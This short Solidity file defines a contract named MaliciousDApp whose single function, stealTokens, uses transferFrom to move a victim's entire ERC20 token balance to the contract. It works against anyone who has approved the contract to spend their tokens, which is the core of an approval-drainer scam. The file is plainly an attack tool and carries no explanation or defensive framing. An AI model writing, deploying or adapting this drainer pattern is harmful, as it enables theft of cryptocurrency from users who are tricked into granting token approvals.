// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";

contract MaliciousDApp {
    function stealTokens(address tokenAddress, address victim) public {
        IERC20 token = IERC20(tokenAddress);
        token.transferFrom(victim, address(this), token.balanceOf(victim));
    }
}
